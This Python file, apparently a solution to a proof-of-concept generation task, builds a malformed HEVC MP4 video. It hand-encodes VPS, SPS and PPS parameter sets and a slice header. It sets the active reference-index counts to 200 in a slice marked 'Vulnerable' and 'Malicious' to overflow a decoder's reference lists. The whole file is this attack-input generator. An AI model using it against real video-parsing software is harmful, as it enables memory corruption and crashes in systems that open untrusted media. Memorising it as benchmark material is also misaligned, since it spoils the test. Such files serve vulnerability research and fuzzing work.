import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitStream:
            def __init__(self):
                self.data = bytearray()
                self.byte = 0
                self.count = 0

            def write_bit(self, b):
                self.byte = (self.byte << 1) | (b & 1)
                self.count += 1
                if self.count == 8:
                    self.data.append(self.byte)
                    self.byte = 0
                    self.count = 0

            def write_bits(self, val, n):
                for i in range(n - 1, -1, -1):
                    self.write_bit((val >> i) & 1)

            def write_ue(self, val):
                if val == 0:
                    self.write_bit(1)
                else:
                    tmp = val + 1
                    width = tmp.bit_length() - 1
                    for _ in range(width):
                        self.write_bit(0)
                    self.write_bit(1)
                    self.write_bits(tmp - (1 << width), width)

            def write_se(self, val):
                if val <= 0:
                    self.write_ue((-val) * 2)
                else:
                    self.write_ue(val * 2 - 1)

            def get_bytes(self):
                if self.count > 0:
                    self.data.append(self.byte << (8 - self.count))
                return self.data

        def rbsp_trailing_bits(bs):
            bs.write_bit(1)
            while bs.count != 0:
                bs.write_bit(0)

        def emulation_prevention(data):
            out = bytearray()
            i = 0
            while i < len(data):
                if i + 2 < len(data) and data[i] == 0 and data[i+1] == 0 and data[i+2] <= 3:
                    out.extend(data[i:i+2])
                    out.append(3)
                    i += 2
                else:
                    out.append(data[i])
                    i += 1
            return out

        # 1. VPS
        bs_vps = BitStream()
        bs_vps.write_bits(0x4001, 16)
        bs_vps.write_bits(0, 4)
        bs_vps.write_bit(1)
        bs_vps.write_bit(1)
        bs_vps.write_bits(0, 6)
        bs_vps.write_bits(0, 3)
        bs_vps.write_bit(1)
        bs_vps.write_bits(0xffff, 16)
        bs_vps.write_bits(1, 8)
        bs_vps.write_bits(0xffffffff, 32)
        bs_vps.write_bits(0, 48)
        bs_vps.write_bits(0, 8)
        bs_vps.write_bit(1)
        bs_vps.write_ue(0)
        bs_vps.write_ue(0)
        bs_vps.write_ue(0)
        bs_vps.write_bits(0, 6)
        bs_vps.write_ue(0)
        bs_vps.write_bit(0)
        bs_vps.write_bit(0)
        rbsp_trailing_bits(bs_vps)
        vps_data = emulation_prevention(bs_vps.get_bytes())

        # 2. SPS
        bs_sps = BitStream()
        bs_sps.write_bits(0x4201, 16)
        bs_sps.write_bits(0, 4)
        bs_sps.write_bits(0, 3)
        bs_sps.write_bit(1)
        bs_sps.write_bits(1, 8)
        bs_sps.write_bits(0xffffffff, 32)
        bs_sps.write_bits(0, 48)
        bs_sps.write_bits(0, 8)
        bs_sps.write_ue(0)
        bs_sps.write_ue(1)
        bs_sps.write_ue(64)
        bs_sps.write_ue(64)
        bs_sps.write_bit(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_bit(1)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_ue(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        bs_sps.write_ue(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        bs_sps.write_bit(0)
        rbsp_trailing_bits(bs_sps)
        sps_data = emulation_prevention(bs_sps.get_bytes())

        # 3. PPS
        bs_pps = BitStream()
        bs_pps.write_bits(0x4401, 16)
        bs_pps.write_ue(0)
        bs_pps.write_ue(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bits(0, 3)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_ue(0)
        bs_pps.write_ue(0)
        bs_pps.write_se(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        bs_pps.write_ue(0)
        bs_pps.write_bit(0)
        bs_pps.write_bit(0)
        rbsp_trailing_bits(bs_pps)
        pps_data = emulation_prevention(bs_pps.get_bytes())

        # 4. Slice (Vulnerable)
        bs_sl = BitStream()
        bs_sl.write_bits(0x0201, 16) # Type 1
        bs_sl.write_bit(1) # first_slice
        bs_sl.write_ue(0) # pps_id
        bs_sl.write_ue(0) # slice_type B
        bs_sl.write_bits(0, 4) # poc_lsb
        bs_sl.write_ue(0) # num_negative_pics (st_rps)
        bs_sl.write_ue(0) # num_positive_pics (st_rps)
        
        # num_ref_idx_active_override_flag = 1
        bs_sl.write_bit(1) 
        
        # Malicious active ref idx counts
        bs_sl.write_ue(200) # L0 overflow
        bs_sl.write_ue(200) # L1 overflow
        
        rbsp_trailing_bits(bs_sl)
        slice_data = emulation_prevention(bs_sl.get_bytes())

        def make_box(type_, data):
            return struct.pack(">I", len(data) + 8) + type_.encode() + data

        # MP4 Construction
        ftyp = make_box("ftyp", b"isom\x00\x00\x02\x00isomiso2mp41")

        hvcc_body = bytearray()
        hvcc_body.append(1)
        hvcc_body.append(1)
        hvcc_body.extend(b"\x60\x00\x00\x00")
        hvcc_body.extend(b"\x00" * 6)
        hvcc_body.append(0)
        hvcc_body.extend(b"\xf0\x00")
        hvcc_body.append(0xfc)
        hvcc_body.append(0xfd)
        hvcc_body.append(0xf8)
        hvcc_body.append(0xf8)
        hvcc_body.extend(b"\x00\x00")
        hvcc_body.append(0x0f)
        hvcc_body.append(0x03)
        hvcc_body.append(3)
        
        hvcc_body.append(0x80 | 32)
        hvcc_body.extend(struct.pack(">H", 1))
        hvcc_body.extend(struct.pack(">H", len(vps_data)))
        hvcc_body.extend(vps_data)
        
        hvcc_body.append(0x80 | 33)
        hvcc_body.extend(struct.pack(">H", 1))
        hvcc_body.extend(struct.pack(">H", len(sps_data)))
        hvcc_body.extend(sps_data)
        
        hvcc_body.append(0x80 | 34)
        hvcc_body.extend(struct.pack(">H", 1))
        hvcc_body.extend(struct.pack(">H", len(pps_data)))
        hvcc_body.extend(pps_data)

        hvcC = make_box("hvcC", hvcc_body)

        vse = bytearray(b"\x00"*6 + b"\x00\x01" + b"\x00"*16)
        vse.extend(struct.pack(">HH", 64, 64))
        vse.extend(b"\x00\x48\x00\x00")
        vse.extend(b"\x00\x48\x00\x00")
        vse.extend(b"\x00"*4)
        vse.extend(b"\x00\x01")
        vse.extend(b"\x05HEVC" + b"\x00"*27)
        vse.extend(b"\x00\x18")
        vse.extend(b"\xff\xff")
        vse.extend(hvcC)
        
        hvc1 = make_box("hvc1", vse)
        stsd = make_box("stsd", b"\x00\x00\x00\x00\x00\x00\x00\x01" + hvc1)
        stts = make_box("stts", b"\x00\x00\x00\x00\x00\x00\x00\x00")
        stsc = make_box("stsc", b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01")
        
        sample_len = len(slice_data) + 4
        stsz = make_box("stsz", struct.pack(">IIII", 0, 0, 1, sample_len))
        
        # Estimate stco
        stco_placeholder = make_box("stco", struct.pack(">II", 0, 1) + b"\x00\x00\x00\x00")
        
        stbl = make_box("stbl", stsd + stts + stsc + stsz + stco_placeholder)
        minf = make_box("minf", make_box("vmhd", b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 
                               make_box("dinf", make_box("dref", b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0curl \x00\x00\x00\x01")) + 
                               stbl)
        mdia = make_box("mdia", make_box("mdhd", b"\x00"*32) + 
                               make_box("hdlr", b"\x00\x00\x00\x00\x00\x00\x00\x00vide\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00") + 
                               minf)
        trak = make_box("trak", make_box("tkhd", b"\x00\x00\x00\x01" + b"\x00"*80) + mdia)
        moov_placeholder = make_box("moov", make_box("mvhd", b"\x00"*100) + trak)
        
        offset = len(ftyp) + len(moov_placeholder) + 8
        stco = make_box("stco", struct.pack(">II", 0, 1) + struct.pack(">I", offset))
        
        stbl = make_box("stbl", stsd + stts + stsc + stsz + stco)
        minf = make_box("minf", make_box("vmhd", b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 
                               make_box("dinf", make_box("dref", b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0curl \x00\x00\x00\x01")) + 
                               stbl)
        mdia = make_box("mdia", make_box("mdhd", b"\x00"*32) + 
                               make_box("hdlr", b"\x00\x00\x00\x00\x00\x00\x00\x00vide\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00") + 
                               minf)
        trak = make_box("trak", make_box("tkhd", b"\x00\x00\x00\x01" + b"\x00"*80) + mdia)
        moov = make_box("moov", make_box("mvhd", b"\x00"*100) + trak)
        
        mdat = make_box("mdat", struct.pack(">I", len(slice_data)) + slice_data)
        
        return ftyp + moov + mdat